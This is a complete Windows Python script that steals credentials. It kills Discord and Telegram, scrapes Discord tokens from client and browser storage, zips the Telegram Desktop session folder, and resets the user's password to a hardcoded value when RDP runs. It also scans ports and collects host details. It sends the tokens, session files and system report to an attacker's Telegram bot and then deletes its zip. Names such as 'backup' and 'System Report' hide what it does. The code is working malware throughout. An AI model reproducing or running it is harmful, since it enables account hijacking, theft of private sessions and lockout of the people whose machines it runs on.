import os
import subprocess
import socket
import platform
import getpass
import requests
import sys
import ctypes
import psutil
import time
import re
from zipfile import ZipFile

# Telegram configuration - these will be updated on first run
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def configure_telegram():
    try:
        if TELEGRAM_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or TELEGRAM_CHAT_ID == "YOUR_TELEGRAM_CHAT_ID":
            token = input("Enter your Telegram Bot Token: ")
            chat_id = input("Enter your Telegram Chat ID: ")
            
            # Read the current script
            with open(__file__, 'r') as file:
                lines = file.readlines()
            
            # Update the token and chat_id lines
            for i, line in enumerate(lines):
                if line.startswith('TELEGRAM_TOKEN ='):
                    lines[i] = f'TELEGRAM_TOKEN = "{token}"\n'
                elif line.startswith('TELEGRAM_CHAT_ID ='):
                    lines[i] = f'TELEGRAM_CHAT_ID = "{chat_id}"\n'
            
            # Write back to the script
            with open(__file__, 'w') as file:
                file.writelines(lines)
            
            return token, chat_id, None
        return TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, None
    except Exception as e:
        return None, None, f"Failed to configure Telegram: {str(e)}"

def get_system_info():
    try:
        ip = socket.gethostbyname(socket.gethostname())
        os_info = platform.system() + " " + platform.release()
        username = getpass.getuser()
        return ip, os_info, username, None
    except Exception as e:
        return "Unknown", "Unknown", "Unknown", f"Failed to get system info: {str(e)}"

def get_mac_address():
    try:
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK and addr.address:
                    return addr.address, None
        return "Unknown", None
    except Exception as e:
        return "Unknown", f"Failed to get MAC address: {str(e)}"

def scan_ports(ip, ports=[3389, 80, 443, 445, 135, 139]):
    open_ports = []
    error = None
    try:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
            except:
                pass
            finally:
                sock.close()
    except Exception as e:
        error = f"Failed to scan ports: {str(e)}"
    return open_ports, error

def is_rdp_host(ip):
    try:
        # Check if RDP service (TermService) is running
        result = subprocess.run(
            ['sc', 'query', 'TermService'],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True
        )
        if "RUNNING" in result.stdout:
            return True, None
    except Exception as e:
        return False, f"Failed to check RDP service: {str(e)}"
    
    # Check if port 3389 is open
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, 3389))
        if result == 0:
            return True, None
    except Exception as e:
        return False, f"Failed to check RDP port: {str(e)}"
    finally:
        try:
            sock.close()
        except:
            pass
    
    return False, None

def change_rdp_password(new_password):
    try:
        username = getpass.getuser()
        result = subprocess.run(
            ['net', 'user', username, new_password],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return True, None
    except subprocess.CalledProcessError as e:
        return False, f"Error: {e.stderr.strip()}"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"

def kill_process(process_name, retries=3, delay=1):
    for _ in range(retries):
        try:
            result = subprocess.run(
                ['taskkill', '/F', '/IM', process_name],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return True, None
        except subprocess.CalledProcessError:
            time.sleep(delay)
    return False, f"Failed to kill process {process_name} after {retries} attempts"

def copy_directory(src, dst, retries=3, delay=1):
    for attempt in range(retries):
        try:
            if not os.path.exists(dst):
                os.makedirs(dst)
            for item in os.listdir(src):
                src_path = os.path.join(src, item)
                dst_path = os.path.join(dst, item)
                if os.path.isdir(src_path):
                    copy_directory(src_path, dst_path, retries, delay)
                else:
                    with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                        f_write.write(f_read.read())
            return None
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(delay)
            else:
                return f"Failed to copy directory {src} to {dst}: {str(e)}"
    return None

def remove_directory(dir_path):
    try:
        for item in os.listdir(dir_path):
            path = os.path.join(dir_path, item)
            if os.path.isdir(path):
                remove_directory(path)
            else:
                os.remove(path)
        os.rmdir(dir_path)
        return None
    except Exception as e:
        return f"Failed to remove directory {dir_path}: {str(e)}"

def find_discord_tokens():
    tokens = []
    error = None
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord"               : roaming + "\\Discord",
        "Discord Canary"        : roaming + "\\discordcanary",
        "Discord PTB"           : roaming + "\\discordptb",
        "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
        "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
        "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
        'Lightcord'             : roaming + "\\Lightcord",
        'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
        'Amigo'                 : local + "\\Amigo\\User Data",
        'Torch'                 : local + "\\Torch\\User Data",
        'Kometa'                : local + "\\Kometa\\User Data",
        'Orbitum'               : local + "\\Orbitum\\User Data",
        'CentBrowser'           : local + "\\CentBrowser\\User Data",
        'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
        'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
        'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
        'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
        'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
        'Iridium'               : local + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb",
        'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
    }

    # Kill Discord processes to avoid file locks
    discord_errors = []
    for proc in ["Discord.exe", "discordcanary.exe", "discordptb.exe"]:
        success, proc_error = kill_process(proc)
        if proc_error:
            discord_errors.append(proc_error)

    try:
        for platform, path in paths.items():
            path = os.path.join(path, "Local Storage", "leveldb")
            if os.path.exists(path):
                for file_name in os.listdir(path):
                    if file_name.endswith((".log", ".ldb", ".sqlite")):
                        try:
                            with open(os.path.join(path, file_name), errors="ignore") as file:
                                for line in file.readlines():
                                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                        for token in re.findall(regex, line):
                                            if f"{token} | {platform}" not in tokens:
                                                tokens.append(f"{token} | {platform}")
                        except Exception as e:
                            discord_errors.append(f"Failed to read {file_name}: {str(e)}")
                            continue
    except Exception as e:
        error = f"Failed to extract Discord tokens: {str(e)}"
    
    if discord_errors:
        error = (error or "") + "\n" + "\n".join(discord_errors)
    return tokens, error

def backup_telegram_data_and_tokens(username, ip):
    user = os.path.expanduser("~")
    source_path = os.path.join(user, "AppData\\Roaming\\Telegram Desktop\\tdata")
    temp_path = os.path.join(user, "AppData\\Local\\Temp\\tdata_session")
    zip_name = f"{username}_{ip.replace('.', '_')}.zip"
    zip_path = os.path.join(user, "AppData\\Local\\Temp", zip_name)
    tokens_temp_path = os.path.join(user, "AppData\\Local\\Temp", "discord_tokens.txt")
    
    telegram_status = "Failed - Telegram data not found or error occurred"
    discord_tokens = []
    errors = []

    try:
        # Get Discord tokens
        discord_tokens, discord_error = find_discord_tokens()
        if discord_error:
            errors.append(discord_error)
        
        # Write tokens to temporary file
        if discord_tokens:
            try:
                with open(tokens_temp_path, 'w') as f:
                    f.write("\n".join(discord_tokens))
            except Exception as e:
                errors.append(f"Failed to write Discord tokens to temp file: {str(e)}")
        
        # Kill Telegram process
        telegram_success, telegram_error = kill_process("Telegram.exe")
        if telegram_error:
            errors.append(telegram_error)
        
        # Create zip file
        with ZipFile(zip_path, 'w') as zipf:
            # Add Telegram data if available
            if os.path.exists(source_path):
                try:
                    if os.path.exists(temp_path):
                        remove_error = remove_directory(temp_path)
                        if remove_error:
                            errors.append(remove_error)
                    copy_error = copy_directory(source_path, temp_path)
                    if copy_error:
                        errors.append(copy_error)
                    else:
                        for root, dirs, files in os.walk(temp_path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                zip_path_in_archive = os.path.join('tg', os.path.relpath(file_path, temp_path))
                                zipf.write(file_path, zip_path_in_archive)
                        telegram_status = "Success"
                except Exception as e:
                    telegram_status = f"Failed - Error copying Telegram data: {str(e)}"
                    errors.append(str(e))
            
            # Add Discord tokens if available
            if discord_tokens and os.path.exists(tokens_temp_path):
                try:
                    zipf.write(tokens_temp_path, 'discord/tokens.txt')
                except Exception as e:
                    errors.append(f"Failed to add Discord tokens to zip: {str(e)}")
        
        return zip_path, discord_tokens, telegram_status, "\n".join(errors) if errors else None
    except Exception as e:
        errors.append(f"Failed to create zip file: {str(e)}")
        return zip_path if os.path.exists(zip_path) else None, discord_tokens, telegram_status, "\n".join(errors) if errors else None
    finally:
        # Clean up
        try:
            if os.path.exists(temp_path):
                remove_error = remove_directory(temp_path)
                if remove_error:
                    errors.append(remove_error)
            if os.path.exists(tokens_temp_path):
                os.remove(tokens_temp_path)
        except Exception as e:
            errors.append(f"Failed to clean up temp files: {str(e)}")

def send_to_telegram(token, chat_id, message, file_path=None):
    # Log message content for debugging
    log_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "telegram_message_log.txt")
    try:
        with open(log_path, 'w', encoding='utf-8') as f:
            f.write(f"Message Content:\n{message}\n\nFile Path: {file_path}")
    except Exception as e:
        print(f"Error: Failed to log message content: {str(e)}")

    # Ensure message is not empty
    if not message.strip():
        message = "System Report: Unable to generate full report due to empty message content."

    try:
        # Send message with optional file attachment
        url = f"https://api.telegram.org/bot{token}/sendDocument" if file_path else f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "caption": message if file_path else message,
            "parse_mode": "Markdown"
        }
        files = None
        if file_path and os.path.exists(file_path):
            files = {'document': (os.path.basename(file_path), open(file_path, 'rb'))}
            # Check zip file size
            file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
            if file_size_mb > 50:
                return f"Failed to send Telegram message: Zip file size ({file_size_mb:.2f} MB) exceeds 50 MB limit"
        
        response = requests.post(url, data=data, files=files, timeout=10)
        response.raise_for_status()
        return None
    except requests.exceptions.HTTPError as e:
        try:
            error_details = response.json().get('description', str(e))
            return f"Failed to send Telegram message: HTTP {response.status_code} - {error_details}"
        except:
            return f"Failed to send Telegram message: HTTP {e.response.status_code} - {str(e)}"
    except Exception as e:
        return f"Failed to send Telegram message: {str(e)}"
    finally:
        # Fallback: Try sending a minimal message if the original fails
        if file_path:  # Only try fallback if the original had a file
            try:
                fallback_message = "System Report: Failed to send full report. Check bot token, chat ID, or network."
                fallback_url = f"https://api.telegram.org/bot{token}/sendMessage"
                fallback_data = {
                    "chat_id": chat_id,
                    "text": fallback_message
                }
                response = requests.post(fallback_url, data=fallback_data, timeout=5)
                response.raise_for_status()
                return "Failed to send full report, sent fallback message"
            except:
                pass

def main():
    # Check for admin privileges
    if not is_admin():
        message = "Error: Script must be run as administrator to scan ports and change password (if RDP host)."
        token, chat_id, config_error = configure_telegram()
        if token and chat_id:
            send_error = send_to_telegram(token, chat_id, message)
            if send_error:
                print(f"Error: {send_error}")
        else:
            print(f"Error: {config_error or 'Failed to configure Telegram'}")
        return

    # Configure Telegram
    token, chat_id, config_error = configure_telegram()
    if not token or not chat_id:
        print(f"Error: {config_error or 'Failed to configure Telegram'}")
        return

    # Get system information
    ip, os_info, username, sys_error = get_system_info()
    errors = [sys_error] if sys_error else []
    
    # Get MAC address
    mac_address, mac_error = get_mac_address()
    if mac_error:
        errors.append(mac_error)
    
    # Scan for open ports
    open_ports, port_error = scan_ports(ip)
    if port_error:
        errors.append(port_error)
    
    # Check if system is an RDP host
    is_rdp, rdp_error = is_rdp_host(ip)
    if rdp_error:
        errors.append(rdp_error)
    
    # Change password if RDP host
    password_status = "Skipped - System is not an RDP host"
    if is_rdp:
        try:
            new_password = "YourDesiredPassword@123"
            success, password_error = change_rdp_password(new_password)
            password_status = "Success" if success else f"Failed - {password_error}"
            if password_error and not success:
                errors.append(password_error)
        except Exception as e:
            password_status = f"Failed - Unexpected error during password change: {str(e)}"
            errors.append(str(e))
    
    # Backup Telegram data and Discord tokens
    zip_path, discord_tokens, telegram_status, backup_error = backup_telegram_data_and_tokens(username, ip)
    discord_status = f"Found {len(discord_tokens)} tokens" if discord_tokens else "No tokens found"
    discord_tokens_str = "\n".join(discord_tokens) if len(discord_tokens) <= 5 else f"Found {len(discord_tokens)} tokens (see zip file)"
    if backup_error:
        errors.append(backup_error)
    
    # Prepare message
    ports_str = ", ".join(map(str, open_ports)) if open_ports else "None"
    message = (
        f"*System Report*\n"
        f"IP: {ip}\n"
        f"OS: {os_info}\n"
        f"Username: {username}\n"
        f"MAC Address: {mac_address}\n"
        f"Open Ports: {ports_str}\n"
        f"Password Change Status: {password_status}\n"
        f"Telegram Data Backup Status: {telegram_status}\n"
        f"Discord Tokens Status: {discord_status}\n"
        f"Discord Tokens:\n```\n{discord_tokens_str}\n```"
    )
    if errors:
        message += f"\n*Errors Encountered*:\n```\n{'\n'.join(errors)}\n```"
    
    # Send to Telegram with zip file if available
    send_error = send_to_telegram(token, chat_id, message, zip_path)
    if send_error:
        errors.append(send_error)
        print(f"Error: {send_error}")
    
    # Clean up zip file
    if zip_path and os.path.exists(zip_path):
        try:
            os.remove(zip_path)
        except Exception as e:
            print(f"Error: Failed to clean up zip file: {str(e)}")

if __name__ == "__main__":
    main()
